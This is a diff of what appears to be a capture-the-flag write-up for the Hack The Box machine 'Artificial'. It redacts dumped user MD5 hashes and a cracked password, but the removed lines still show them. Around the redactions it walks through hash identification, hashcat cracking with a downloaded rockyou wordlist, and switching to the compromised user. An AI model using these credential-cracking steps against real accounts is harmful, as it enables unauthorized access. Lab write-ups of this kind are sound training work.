@@ -505,14 +505,14 @@ Enter ".help" for usage hints.
 sqlite> .tables
 model  user
 sqlite> SELECT * FROM user;
-1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
-2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
-3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
-4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
-5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
-6|solomon|sol@mial.com|e10adc3949ba59abbe56e057f20f883e
-7|solo|solo@mail.com|827ccb0eea8a706c4c34a16891f84e7b
-8|hacker@htb.com|hacker@htb.com|000747de68d6f043504bbb3c01c42033
+1|gael|gael@artificial.htb|[REDACTED-MD5-HASH]
+2|mark|mark@artificial.htb|[REDACTED-MD5-HASH]
+3|robert|robert@artificial.htb|[REDACTED-MD5-HASH]
+4|royer|royer@artificial.htb|[REDACTED-MD5-HASH]
+5|mary|mary@artificial.htb|[REDACTED-MD5-HASH]
+6|solomon|sol@mial.com|[REDACTED-MD5-HASH]
+7|solo|solo@mail.com|[REDACTED-MD5-HASH]
+8|hacker@htb.com|hacker@htb.com|[REDACTED-MD5-HASH]
 ```
 
 Perfect! We've found hashed passwords for all users, including `gael`.
@@ -526,7 +526,7 @@ We identify the hash type using name-that-hash:
 pip3 install name-that-hash
 
 # Identify the hash
-nth -t "c99175974b6e192936d97224638a34f8"
+nth -t "[REDACTED-MD5-HASH]"
 
 Most Likely
 MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
@@ -546,7 +546,7 @@ We create a script to crack the hash using hashcat:
 ```bash
 #!/bin/bash
 MODE=0
-HASH="c99175974b6e192936d97224638a34f8"
+HASH="[REDACTED-MD5-HASH]"
 WORDLIST_URL="https://raw.githubusercontent.com/beaulieuhugo97/pentest-cheatsheets/refs/heads/main/wordlists/rockyou.txt.tar.gz"
 
 # Create new directory to work in
@@ -562,15 +562,15 @@ echo $HASH > hash.txt
 hashcat -m $MODE -a 0 hash.txt ./*.txt -w 4
 ```
 
-The password is successfully cracked: `mattp005numbertwo`
+The password is successfully cracked: `[REDACTED]`
 
 ```
-c99175974b6e192936d97224638a34f8:mattp005numbertwo
+[REDACTED-MD5-HASH]:[REDACTED]
 
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 0 (MD5)
-Hash.Target......: c99175974b6e192936d97224638a34f8
+Hash.Target......: [REDACTED-MD5-HASH]
 Time.Started.....: Fri Aug 15 15:55:46 2025 (2 secs)
 Time.Estimated...: Fri Aug 15 15:55:48 2025 (0 secs)
 Kernel.Feature...: Pure Kernel
@@ -592,7 +592,7 @@ We switch to the `gael` user and retrieve the flag:
 
 ```bash
 $ su gael
-Password: mattp005numbertwo
+Password: [REDACTED]
 whoami
 gael
 cd /home/gael
